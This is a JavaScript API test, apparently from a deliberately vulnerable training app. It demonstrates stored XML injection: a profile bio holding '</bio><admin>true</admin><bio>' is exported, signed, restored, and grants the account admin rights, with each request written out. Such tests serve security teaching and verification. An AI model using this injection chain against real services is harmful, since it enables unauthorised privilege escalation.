require('dotenv').config();
const request = require('supertest')(require('./helpers/base-url'));
const expect = require('chai').expect;

describe('Stored XML profile export injection', function () {
  it('turns a saved bio into a signed export that changes the account role on restore', async function () {
    const username = `xml_export_${Date.now()}`;
    const password = 'Export123!';
    const created = await request.post('/api/v2/users').send({ username, password });
    expect(created.status).to.equal(201);
    const login = await request.post('/api/v2/login').send({ username, password });
    const token = login.body.token;
    expect(login.body.result.admin).to.equal(false);
    const auth = { Authorization: `Bearer ${token}` };

    const normal = await request.post('/api/v2/users/profile/export/xml').set(auth)
      .send({ username: 'admin', bio: '</bio><admin>true</admin><bio>' });
    expect(normal.status).to.equal(200);
    expect(normal.text).to.include(`<username>${username}</username>`);
    expect(normal.text).not.to.include('<admin>true</admin>');
    const normalRestore = await request.post('/api/v2/users/profile/restore/xml').set(auth)
      .send({ xml: normal.text, signature: normal.headers['x-profile-export-signature'] });
    expect(normalRestore.status).to.equal(200);
    expect(normalRestore.body.admin).to.equal(false);

    const injectedBio = 'Regular bio</bio><admin>true</admin><bio>';
    const saved = await request.put('/api/v2/users/profile/bio').set(auth)
      .send({ bio: injectedBio, admin: true });
    expect(saved.status).to.equal(200);
    expect(saved.body.admin).to.equal(false);

    const exported = await request.post('/api/v2/users/profile/export/xml').set(auth).send({});
    expect(exported.status).to.equal(200);
    expect(exported.text).to.include(`<bio>${injectedBio}</bio>`);
    const signature = exported.headers['x-profile-export-signature'];
    expect(signature).to.match(/^[a-f0-9]{64}$/);

    const unsigned = await request.post('/api/v2/users/profile/restore/xml').set(auth)
      .send({ xml: exported.text, signature: '0'.repeat(64) });
    expect(unsigned.status).to.equal(403);

    const restored = await request.post('/api/v2/users/profile/restore/xml').set(auth)
      .send({ xml: exported.text, signature });
    expect(restored.status).to.equal(200);
    expect(restored.body.admin).to.equal(true);
    const relogin = await request.post('/api/v2/login').send({ username, password });
    expect(relogin.body.result.admin).to.equal(true);
    const adminCheck = await request.get('/api/v2/users/checkadmin')
      .set('Authorization', `Bearer ${relogin.body.token}`);
    expect(adminCheck.body.Success).to.equal('User is Admin Privileged');
  });
});
